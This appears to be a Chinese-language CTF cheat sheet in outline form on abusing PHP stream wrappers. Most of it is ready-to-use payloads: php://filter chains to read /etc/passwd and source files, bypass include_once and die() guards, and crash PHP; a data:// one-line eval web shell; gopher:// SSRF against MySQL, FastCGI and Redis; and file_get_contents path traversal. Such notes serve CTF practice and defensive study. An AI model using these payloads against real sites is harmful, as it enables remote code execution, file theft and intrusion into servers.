- [官方文档](https://www.php.net/manual/en/wrappers.php)
- `php://`
	- 各种编码的加解密
		- ```
		  php://filter/read=convert.base64-encode/resource=
		  php://filter/read=convert.base64-decode/resource=
		  php://filter/write=convert.base64-decode/resource=
		  php://filter/write=string.rot13/resource=
		  php://filter/zlib.inflate/resource=
		  ```
	- include无写入文件RCE
	  id:: 63bc02d6-ea56-4c2a-a494-0cb277531dba
		- [Payload生成](https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT)
		- 如果是`include_once`或者`require_once`那可能要配合 ((636665b7-cd42-4bd2-a685-f5e5cc4f5ec7))
	- 让php崩溃，从而让临时文件留在/tmp中
	  id:: 636665b7-767d-440c-8482-bb5e1dc0933c
		- `php://filter/string.strip_tags/resource=/etc/passwd`
	- 让`include_once`和`require_once`失效：
	  id:: 636665b7-cd42-4bd2-a685-f5e5cc4f5ec7
		- `php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/etc/passwd`
	- isset 支持 php 伪协议
	- 绕开死亡`die`
		- `php://filter/write=string.strip_tags|convert.base64-decode/resource=`
- `data://`
	- include无写入文件RCE
		- `data://text/plain,<?php eval($_POST['data']);?>`
	- base64
		- `data://text/plain;base64,`
- `gopher://`
  id:: 62f27746-a352-41d4-b76d-63fc1f7c9e4f
	- `gopher://127.0.0.1:9000/_xxx`
		- 其中xxx是TCP发送的数据
	- 打SSRF
		- 打无密码MySQL
			- 只需要无密码用户的用户名即可执行任意SQL指令
		- 打FastCGI
			- 只需要一个存在主机上文件的路径就可以执行任意Shell指令
		- 可以打：`mysql, postgresql, fastcgi, redis, smtp, zabbix, pymemcache, rbmemcache, phpmemcache, dmpmemcache`
	- Payload可以用 ((62f14125-43fc-4da5-b83f-4d56aa1d2157)) 生成
- `file://`
	- 读取文件
- `dict://`
	- 发送TCP数据，感觉不如`gopher://`
- `glob://`
	- 读取目录
	- {{embed [[CTF/PHP/目录读取]]}}
- 另：
	- java 的`file://`可以读取目录
	- 能用`file://`的地方有时可以不用`file://`, 直接读取
		- 比如`file:///etc/passwd`和`/etc/passwd`
- 有关file_get_contents()函数的一个trick，可以看作是SSRF的一个黑魔法，当PHP的 file_get_contents() 函数在遇到不认识的伪协议头时候会将伪协议头当做文件夹，造成目录穿越漏洞，这时候只需不断往上跳转目录即可读到根目录的文件。
	- ```
	  httpsssss://../../../../../../etc/passwd
	  httpsssss://abc../../../../../../etc/passwd
	  ```